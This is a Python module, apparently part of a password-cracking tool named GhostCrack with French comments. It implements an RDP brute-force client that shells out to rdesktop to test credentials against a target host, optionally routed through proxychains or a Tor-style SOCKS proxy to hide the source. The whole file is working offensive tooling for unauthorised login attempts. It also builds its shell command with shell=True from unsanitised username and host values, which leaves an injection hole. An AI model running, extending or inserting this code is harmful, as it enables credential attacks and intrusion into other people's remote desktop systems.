#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Module RDP pour GhostCrack - Gère les connexions RDP (version alpha)
"""

import subprocess
import socket
import logging
import os
import tempfile
import time
from typing import Optional, Dict, Any

class RDPClient:
    """Client RDP pour brute force (alpha)"""
    
    def __init__(self, host: str, username: str, password: str, 
                port: Optional[int] = None, timeout: int = 10, 
                proxy: Optional[str] = None):
        """
        Initialise un client RDP (version alpha)
        
        Note: Cette implémentation est basique et utilise rdesktop.
              Une future version utilisera une bibliothèque RDP native.
        
        Args:
            host: Hôte cible
            username: Nom d'utilisateur
            password: Mot de passe à tester
            port: Port RDP (3389 par défaut)
            timeout: Timeout en secondes
            proxy: Proxy à utiliser (format: socks5://127.0.0.1:9050)
        """
        self.host = host
        self.username = username
        self.password = password
        self.port = port or 3389
        self.timeout = timeout
        self.proxy = proxy
        self.logger = logging.getLogger(__name__)
        self.last_response = {}
    
    def authenticate(self) -> bool:
        """
        Tente une authentification RDP
        
        Note: Cette méthode est expérimentale et utilise rdesktop en externe.
              Elle sera remplacée par une implémentation utilisant une bibliothèque Python.
        
        Returns:
            bool: True si l'authentification réussit, False sinon
        """
        # Vérification de la présence de rdesktop
        if not self._check_rdesktop():
            self.last_response = {
                'success': False,
                'error': 'tool_missing',
                'message': 'rdesktop n\'est pas installé'
            }
            return False
        
        # Configuration du proxy si nécessaire
        proxy_cmd = ""
        if self.proxy:
            proxy_type, proxy_addr = self._parse_proxy(self.proxy)
            if proxy_type and proxy_addr:
                # Pour rdesktop, on doit utiliser un proxy SOCKS
                if proxy_type.startswith('socks'):
                    proxy_host, proxy_port = proxy_addr.split(':')
                    proxy_cmd = f"proxychains -q "  # Utilise proxychains pour le proxy SOCKS
                    
                    # Configuration temporaire pour proxychains
                    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                        f.write(f"strict_chain\n")
                        f.write(f"proxy_dns\n")
                        f.write(f"remote_dns_subnet 224\n")
                        f.write(f"tcp_read_time_out 15000\n")
                        f.write(f"tcp_connect_time_out 8000\n")
                        f.write(f"[ProxyList]\n")
                        
                        if proxy_type == 'socks5':
                            f.write(f"socks5 {proxy_host} {proxy_port}\n")
                        elif proxy_type == 'socks4':
                            f.write(f"socks4 {proxy_host} {proxy_port}\n")
                        
                        proxychains_path = f.name
                    
                    # On utilise la variable d'environnement pour le fichier de config
                    os.environ['PROXYCHAINS_CONF_FILE'] = proxychains_path
                else:
                    self.logger.warning(f"Type de proxy non supporté pour RDP: {proxy_type}")
        
        # Création d'un fichier temporaire pour stocker le mot de passe
        temp_pass = None
        try:
            temp_pass = tempfile.NamedTemporaryFile(mode='w', delete=False)
            temp_pass.write(self.password)
            temp_pass.close()
            
            # Construction de la commande rdesktop
            cmd = f"{proxy_cmd}rdesktop -u {self.username} -p - -f {self.host}:{self.port}"
            
            # Exécution de la commande avec timeout
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Envoi du mot de passe
            with open(temp_pass.name, 'r') as f:
                password = f.read()
                stdout, stderr = process.communicate(input=password, timeout=self.timeout)
            
            # Analyse du résultat
            if process.returncode == 0:
                # Succès
                self.last_response = {
                    'success': True,
                    'message': 'Connexion réussie',
                    'error': None
                }
                return True
            else:
                # Échec
                if "Authentication failure" in stderr:
                    self.last_response = {
                        'success': False,
                        'error': 'authentication_failed',
                        'message': 'Authentification échouée'
                    }
                elif "Connection refused" in stderr:
                    self.last_response = {
                        'success': False,
                        'error': 'connection_refused',
                        'message': 'Connexion refusée'
                    }
                else:
                    self.last_response = {
                        'success': False,
                        'error': 'rdp_error',
                        'message': stderr
                    }
                return False
                
        except subprocess.TimeoutExpired:
            # Timeout
            self.last_response = {
                'success': False,
                'error': 'timeout',
                'message': 'Timeout de connexion'
            }
            return False
            
        except Exception as e:
            # Erreurs diverses
            self.last_response = {
                'success': False,
                'error': 'unknown_error',
                'message': str(e)
            }
            return False
            
        finally:
            # Nettoyage
            if temp_pass and os.path.exists(temp_pass.name):
                os.unlink(temp_pass.name)
    
    def _check_rdesktop(self) -> bool:
        """
        Vérifie si rdesktop est installé
        
        Returns:
            bool: True si rdesktop est installé, False sinon
        """
        try:
            subprocess.run(["which", "rdesktop"], 
                          stdout=subprocess.PIPE, 
                          stderr=subprocess.PIPE, 
                          check=True)
            return True
        except subprocess.CalledProcessError:
            return False
    
    def _parse_proxy(self, proxy_str: str) -> tuple:
        """
        Parse une chaîne de proxy
        
        Args:
            proxy_str: Chaîne de proxy (ex: socks5://127.0.0.1:9050)
            
        Returns:
            tuple: (type, adresse) ou (None, None) si invalide
        """
        if not proxy_str or '://' not in proxy_str:
            return None, None
        
        try:
            proxy_type, proxy_addr = proxy_str.split('://')
            return proxy_type, proxy_addr
        except ValueError:
            return None, None
    
    def get_last_response(self) -> Dict[str, Any]:
        """
        Récupère la dernière réponse
        
        Returns:
            dict: La dernière réponse
        """
        return self.last_response